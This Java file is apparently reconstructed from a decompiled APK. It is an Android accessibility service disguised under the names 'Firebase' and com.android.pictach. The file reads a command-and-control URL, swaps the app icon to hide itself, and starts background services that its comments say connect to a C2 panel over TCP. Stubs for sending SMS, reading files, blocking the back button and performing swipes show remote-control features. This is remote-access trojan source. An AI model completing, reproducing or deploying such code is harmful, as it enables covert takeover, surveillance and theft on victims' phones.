package com.android.pictach;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;

public class Firebase extends AccessibilityService {

    public static Boolean  FirebaseFOR_IN      = false;
    public static Boolean  FirebaseFOR_prim     = false;
    public static Boolean  Firebasebypass       = false;
    public static String   FirebaseOFK          = "on";
    public static boolean  FirebaseCheckPrims   = false;
    public static String   fileReadStatus       = "on";
    public static boolean  needPaste            = false;
    public static String   pasteText            = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Set AccessibilityServiceInfo — APK onServiceConnected units [3-24]
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags            = 19;
            info.eventTypes       = 0xF;
            info.notificationTimeout = 0L;
            info.packageNames     = null;
            info.feedbackType     = 0xF;
            setServiceInfo(info);
        } catch (Exception ignored) {}

        // Set accessibility instance — APK unit [27]
        love.MyAccess = this;

        // Read C2 URL from resources and store — APK Api.onCreate units [66-77]
        // This populates Utils.p_Utils_r which Api.initializeAndConnect checks
        try {
            Utils.p_Utils_r = getApplicationContext().getResources()
                    .getString(R.string.newss);
        } catch (Exception ignored) {
            // Falls back to love.Host / love.Port which are hardcoded in love.java
        }

        // Icon swap — APK myker.setSupportCompoundDrawablesTintMode units [340-346]
        try {
            Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
        } catch (Exception ignored) {}

        // Guard: skip if already initialized — APK myker unit [349-351]
        if (Utils.iamworking) {
            return;
        }

        // Mark initialized — APK myker units [353-355]
        love.allok = true;
        Utils.iamworking = true;

        // Start Api directly — APK myker units [371-399]
        // Api.onCreate → initializeAndConnect → NetworkManager → TCP connect
        // → sendHandshake → panel shows "New Keys..." → "Ready"
        try {
            if (LoveApi0.isServiceNotRunning(Api.class, getApplicationContext())) {
                startService(new Intent(getApplicationContext(), Api.class));
            }
        } catch (Exception ignored) {}

        // Start love service — APK onServiceConnected units [118-137]
        try {
            if (LoveApi0.isServiceNotRunning(love.class, getApplicationContext())) {
                startService(new Intent(getApplicationContext(), love.class));
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {}

    @Override
    public void onInterrupt() {}

    public void blockBackButton() {}
    public void goHome() {}
    public void triggerAction() {}
    public void performSwipe(String s) {}
    public void drawSwipePath(android.graphics.Point[] pts, int dur) {}
    public String readFile(String path) { return ""; }
    public static void sendSMS(String num, String msg) {}
}
